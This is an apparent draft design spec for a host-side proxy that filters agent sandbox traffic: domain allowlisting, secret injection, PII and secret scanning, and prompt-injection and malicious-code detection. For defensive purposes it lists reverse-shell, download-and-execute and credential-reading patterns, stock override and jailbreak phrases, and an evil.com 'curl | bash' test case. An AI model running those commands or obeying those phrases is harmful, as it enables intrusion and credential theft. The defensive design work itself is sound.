# REQ-025: AI Firewall — Network-Boundary Security for Agent Traffic

**Status:** Draft
**Priority:** P0
**Created:** 2026-03-09
**Related:** GRD-5 (Sandbox Hardening), PII Firewall (`infrastructure/pii/presidio_firewall.py`), Vault (`infrastructure/vault/`)

---

## Problem

Lintel's current security model operates **inside** the agent process:
- PII detection runs in-process via Presidio before text reaches the model
- Sandbox containers have resource limits and network toggling
- Secrets are stored in Vault but injected into agent context as environment variables

This is insufficient because:

1. **Agent can bypass in-process guards** — if a model is manipulated via prompt injection, it could instruct its own runtime to skip the PII check or exfiltrate secrets from its environment
2. **No outbound traffic inspection** — once `network_enabled=True`, agents can call any URL with any payload. There's no inspection of what data leaves the sandbox
3. **No inbound response scanning** — model responses aren't scanned for malicious code patterns before being executed in sandboxes
4. **Secrets in agent memory** — API keys injected as env vars are readable by model-generated code

## Goal

Implement a **network-boundary AI firewall** that sits between agent sandboxes and external services (LLM providers, APIs, repos). The firewall intercepts all traffic, strips secrets, detects PII/prompt injections/malicious code, and enforces allowlists — independent of agent behaviour.

Inspired by OpenClaw's firewall architecture: protections live **outside** the agent VM so they cannot be circumvented by model output.

---

## Architecture

```
                    ┌──────────────────────────────────┐
                    │         LINTEL HOST               │
                    │                                   │
                    │  ┌────────────┐  ┌────────────┐  │
                    │  │  Sandbox A │  │  Sandbox B │  │
                    │  │  (coder)   │  │  (reviewer) │  │
                    │  └──────┬─────┘  └──────┬─────┘  │
                    │         │               │         │
                    │         ▼               ▼         │
                    │  ┌─────────────────────────────┐  │
                    │  │       AI FIREWALL PROXY      │  │
                    │  │  (runs on host, not sandbox) │  │
                    │  │                              │  │
                    │  │  ┌─────────────────────────┐ │  │
                    │  │  │  Outbound Scanning      │ │  │
                    │  │  │  • PII detection         │ │  │
                    │  │  │  • Secret stripping      │ │  │
                    │  │  │  • Domain allowlist      │ │  │
                    │  │  └─────────────────────────┘ │  │
                    │  │  ┌─────────────────────────┐ │  │
                    │  │  │  Inbound Scanning       │ │  │
                    │  │  │  • Prompt injection      │ │  │
                    │  │  │  • Malicious code        │ │  │
                    │  │  │  • Jailbreak detection   │ │  │
                    │  │  └─────────────────────────┘ │  │
                    │  │  ┌─────────────────────────┐ │  │
                    │  │  │  Secret Injection       │ │  │
                    │  │  │  • Adds API keys at     │ │  │
                    │  │  │    network layer         │ │  │
                    │  │  │  • Keys never enter     │ │  │
                    │  │  │    sandbox memory        │ │  │
                    │  │  └─────────────────────────┘ │  │
                    │  └──────────────┬──────────────┘  │
                    │                 │                  │
                    └─────────────────┼──────────────────┘
                                      │
                              ┌───────▼───────┐
                              │   Internet    │
                              │  (LLM APIs,  │
                              │   GitHub,    │
                              │   etc.)      │
                              └──────────────┘
```

**Key principle:** Sandboxes can only reach the internet via the firewall proxy. Docker network rules enforce this — no direct egress from sandbox containers.

---

## Design

### 1. Firewall Proxy

An HTTP/HTTPS forward proxy running on the host (not inside any sandbox). All sandbox containers are configured with `HTTP_PROXY` / `HTTPS_PROXY` pointing to it.

```python
class AIFirewallProxy:
    """Network-boundary proxy that intercepts all sandbox egress traffic."""

    def __init__(
        self,
        secret_injector: SecretInjector,
        outbound_scanner: OutboundScanner,
        inbound_scanner: InboundScanner,
        domain_allowlist: DomainAllowlist,
        audit_logger: AuditLogger,
    ) -> None: ...

    async def handle_request(self, request: ProxyRequest) -> ProxyResponse:
        # 1. Check domain allowlist
        if not self._domain_allowlist.is_allowed(request.host):
            self._audit_logger.blocked("domain_denied", request)
            return ProxyResponse.blocked("Domain not in allowlist")

        # 2. Scan outbound payload
        scan = await self._outbound_scanner.scan(request.body)
        if scan.has_violations:
            self._audit_logger.blocked("outbound_violation", request, scan)
            return ProxyResponse.blocked(scan.summary)

        # 3. Inject secrets (API keys added at network layer)
        request = self._secret_injector.inject(request)

        # 4. Forward to destination
        response = await self._forward(request)

        # 5. Scan inbound response
        scan = await self._inbound_scanner.scan(response.body)
        if scan.has_violations:
            self._audit_logger.blocked("inbound_violation", response, scan)
            return ProxyResponse.blocked(scan.summary)

        return response
```

**Location:** `src/lintel/infrastructure/firewall/proxy.py`

### 2. Secret Injection at Network Layer

**Problem:** If API keys are env vars in the sandbox, model-generated code can read them (`os.environ["GITHUB_TOKEN"]`) and exfiltrate them.

**Solution:** Secrets never enter the sandbox. The firewall proxy injects auth headers/tokens at the network boundary:

```python
class SecretInjector:
    """Injects credentials into outbound requests at the proxy layer."""

    def __init__(self, vault: SecretVault) -> None:
        self._vault = vault
        self._rules: list[InjectionRule] = []

    def inject(self, request: ProxyRequest) -> ProxyRequest:
        for rule in self._rules:
            if rule.matches(request.host, request.path):
                credential = self._vault.get(rule.credential_id)
                request = rule.apply(request, credential)
        return request
```

Injection rules map domains to credentials:

| Domain pattern | Credential | Injection method |
|---|---|---|
| `api.github.com` | GitHub PAT | `Authorization: Bearer <token>` |
| `api.anthropic.com` | Anthropic API key | `x-api-key: <key>` |
| `api.openai.com` | OpenAI API key | `Authorization: Bearer <token>` |
| `*.slack.com` | Slack bot token | `Authorization: Bearer <token>` |
| Custom domains | User-configured | Header or query param |

**Result:** Sandbox code can `curl https://api.github.com/repos/...` without any token — the proxy adds it transparently. The model never sees the credential value.

### 3. Outbound Scanning (Egress)

Scans all data leaving sandboxes before it reaches the internet.

#### 3.1 PII Detection

Reuse the existing `PresidioFirewall` engine:

| Entity type | Examples | Action |
|---|---|---|
| `PERSON` | Full names | Strip and replace with placeholder |
| `US_SSN` | Social Security Numbers | **Block request** |
| `CREDIT_CARD` | Card numbers | **Block request** |
| `EMAIL_ADDRESS` | Email addresses | Strip from non-email requests |
| `PHONE_NUMBER` | Phone numbers | Strip |
| `US_BANK_NUMBER` | Bank account numbers | **Block request** |

#### 3.2 Secret Detection

Scan outbound payloads for credentials that should never leave the system:

| Pattern | Description |
|---|---|
| `sk-[a-zA-Z0-9]{48}` | OpenAI API keys |
| `sk-ant-[a-zA-Z0-9-]{90,}` | Anthropic API keys |
| `ghp_[a-zA-Z0-9]{36}` | GitHub personal access tokens |
| `xoxb-[0-9-]+` | Slack bot tokens |
| `-----BEGIN (RSA\|EC\|OPENSSH) PRIVATE KEY-----` | Private keys |
| `AKIA[0-9A-Z]{16}` | AWS access key IDs |

These extend the existing `create_api_key_recognizer()` in `infrastructure/pii/custom_recognizers.py`.

#### 3.3 Domain Allowlist

Per-project configurable allowlist. Default:

```yaml
default_allowlist:
  - "api.anthropic.com"
  - "api.openai.com"
  - "api.github.com"
  - "*.githubusercontent.com"
  - "pypi.org"
  - "registry.npmjs.org"
  - "*.docker.io"

# Projects can add custom domains
project_allowlist:
  - "api.example.com"
```

Requests to non-allowlisted domains are blocked and logged.

### 4. Inbound Scanning (Ingress)

Scans model responses and external API responses before they reach sandbox code.

#### 4.1 Prompt Injection Detection

Detect attempts to override agent instructions in model responses or tool outputs:

| Pattern category | Examples | Detection method |
|---|---|---|
| **Instruction overrides** | "Ignore previous instructions", "Your new role is..." | Regex + classifier |
| **Jailbreak attempts** | "DAN mode", "Developer mode enabled" | Known pattern database |
| **Safety bypasses** | "Pretend you have no restrictions" | Semantic classifier |
| **System prompt extraction** | "Repeat your system prompt", "What were you told?" | Regex + intent classifier |

Implementation approach:
- **Phase 1:** Regex-based pattern matching against known injection templates (fast, low false-positive)
- **Phase 2:** Lightweight classifier model (distilled from existing research) for semantic detection

```python
class PromptInjectionDetector:
    """Detects prompt injection attempts in text."""

    def scan(self, text: str) -> ScanResult:
        violations = []
        violations.extend(self._regex_scan(text))
        violations.extend(self._classifier_scan(text))  # Phase 2
        return ScanResult(violations=violations)
```

#### 4.2 Malicious Code Detection

Scan model-generated code before it executes in a sandbox:

| Pattern category | Examples | Risk |
|---|---|---|
| **Reverse shells** | `bash -i >& /dev/tcp/...`, `nc -e /bin/sh` | Critical |
| **Download & execute** | `curl ... \| bash`, `wget ... && chmod +x && ./` | Critical |
| **Encoded execution** | `base64 -d \| sh`, `python -c "exec(b64decode(...))"` | Critical |
| **Sensitive file access** | `/etc/shadow`, `/etc/passwd`, `~/.ssh/id_rsa` | High |
| **Credential harvesting** | `env \| grep -i key`, `cat ~/.aws/credentials` | High |
| **Network reconnaissance** | `nmap`, `netstat -tulpn`, `ss -tulpn` | Medium |

```python
class MaliciousCodeDetector:
    """Detects known malicious patterns in code output."""

    CRITICAL_PATTERNS = [
        (r"bash\s+-i\s+>&\s+/dev/tcp/", "reverse_shell"),
        (r"nc\s+(-e|-c)\s+/bin/(sh|bash)", "reverse_shell"),
        (r"curl\s+.*\|\s*(ba)?sh", "download_execute"),
        (r"wget\s+.*&&\s*chmod\s+\+x", "download_execute"),
        (r"base64\s+(-d|--decode)\s*\|\s*(ba)?sh", "encoded_execution"),
        (r"python[23]?\s+-c\s+.*exec\(.*decode", "encoded_execution"),
        (r"cat\s+(/etc/shadow|~/.ssh/id_rsa)", "sensitive_file_access"),
        (r"eval\s*\(\s*\$\(", "command_injection"),
    ]

    def scan(self, code: str) -> ScanResult: ...
```

### 5. Audit Trail

Every firewall decision is logged as a structured event:

```python
@dataclass(frozen=True)
class FirewallEvent:
    timestamp: datetime
    sandbox_id: str
    direction: Literal["inbound", "outbound"]
    action: Literal["allowed", "blocked", "modified"]
    rule_matched: str | None
    destination: str           # Host or "model_response"
    violation_type: str | None  # "pii", "secret", "prompt_injection", "malicious_code", "domain"
    details: dict[str, Any]
```

Events feed into:
- **Security Dashboard** (existing `SecurityDashboardPage`) — real-time violation counts, blocked requests
- **GuardrailEngine** — firewall events can trigger escalation rules (e.g., 3 blocked requests in a run → pause workflow)
- **Event Store** — full audit trail per workflow run

### 6. Docker Network Enforcement

Sandboxes must route all traffic through the firewall. Enforced at the Docker network level:

```python
# In DockerSandboxManager.create():
sandbox_network = docker.networks.create(
    f"lintel-sandbox-{sandbox_id}",
    driver="bridge",
    internal=True,  # No direct internet access
)

# Firewall proxy container is the only gateway
firewall_container = self._get_firewall_container()
sandbox_network.connect(firewall_container)
sandbox_network.connect(sandbox_container)

# Sandbox env vars point to firewall proxy
environment = {
    "HTTP_PROXY": f"http://firewall:8888",
    "HTTPS_PROXY": f"http://firewall:8888",
    "NO_PROXY": "localhost,127.0.0.1",
}
```

---

## Detection Coverage Summary

### Personal Information
| Threat | Detected | Scanner |
|---|---|---|
| Full names (PERSON) | ✓ | Presidio (outbound) |
| SSNs (US_SSN) | ✓ | Presidio (outbound) — **blocks** |
| Credit card numbers | ✓ | Presidio (outbound) — **blocks** |
| Email addresses | ✓ | Presidio (outbound) |
| Phone numbers | ✓ | Presidio (outbound) |
| API keys & secrets | ✓ | Custom recogniser + regex (outbound) — **blocks** |
| Private keys | ✓ | Regex (outbound) — **blocks** |

### Prompt Injections
| Threat | Detected | Scanner |
|---|---|---|
| Instruction overrides | ✓ | Regex + classifier (inbound) |
| Jailbreak attempts | ✓ | Pattern database (inbound) |
| Safety bypasses | ✓ | Semantic classifier (inbound, Phase 2) |
| System prompt extraction | ✓ | Regex + intent classifier (inbound) |

### Malicious Code
| Threat | Detected | Scanner |
|---|---|---|
| Reverse shells | ✓ | Regex (inbound) — **blocks** |
| Download & execute chains | ✓ | Regex (inbound) — **blocks** |
| Encoded execution | ✓ | Regex (inbound) — **blocks** |
| Sensitive file access | ✓ | Regex (inbound) — **warns** |
| Credential harvesting | ✓ | Regex (inbound) — **blocks** |

---

## Implementation Phases

### Phase 1: Network Isolation & Secret Injection
- Docker network enforcement (internal bridge + firewall gateway)
- `SecretInjector` — proxy adds auth headers, secrets removed from sandbox env
- Domain allowlist (block all except configured domains)
- Audit logging for all proxy requests
- **Test:** Sandbox cannot reach internet directly; `curl api.github.com` works via proxy with injected token; `curl evil.com` is blocked

### Phase 2: Outbound Scanning
- Integrate `PresidioFirewall` into proxy for egress PII scanning
- Secret pattern detection (API keys, private keys in outbound payloads)
- Security Dashboard integration (violation counts, blocked request log)
- **Test:** Sandbox code that tries to POST an SSN to an external URL is blocked

### Phase 3: Inbound Scanning
- `PromptInjectionDetector` — regex patterns for known injection templates
- `MaliciousCodeDetector` — reverse shells, download-execute, encoded execution
- Model response scanning before sandbox execution
- **Test:** Model response containing `curl evil.com | bash` is caught before reaching sandbox

### Phase 4: Semantic Detection & Hardening
- ML-based prompt injection classifier (beyond regex)
- Adaptive pattern updates (new injection techniques)
- Per-project security policies (stricter scanning for production-connected workflows)
- Integration with GuardrailEngine (firewall violations → escalation rules)

---

## Relationship to Existing Security

| Existing component | Role after REQ-025 |
|---|---|
| `PresidioFirewall` | Reused as the PII scanning engine inside the proxy's outbound scanner |
| `Vault` | Stores secrets; proxy reads from Vault to inject at network layer |
| `SandboxConfig.network_enabled` | Still used — but when `True`, traffic goes through firewall proxy, not direct |
| GRD-5 (Sandbox Hardening) | Complementary — GRD-5 handles resource limits and syscall filtering; REQ-025 handles network traffic |
| Custom recognisers (`custom_recognizers.py`) | Extended with additional secret patterns for outbound scanning |

## Open Questions

1. **Proxy implementation:** Use mitmproxy (mature, HTTPS interception) or build a lightweight asyncio proxy?
2. **HTTPS inspection:** MitM proxies require installing a CA cert in sandboxes — acceptable trade-off for security?
3. **Performance:** Adding scanning to every request adds latency. Cache scan results for repeated patterns?
4. **False positives:** How to handle legitimate code that matches malicious patterns (e.g., a security tutorial mentioning reverse shells)?
5. **Model-as-judge:** Should we use a small, fast LLM to classify ambiguous cases (prompt injection, malicious intent) in Phase 4?
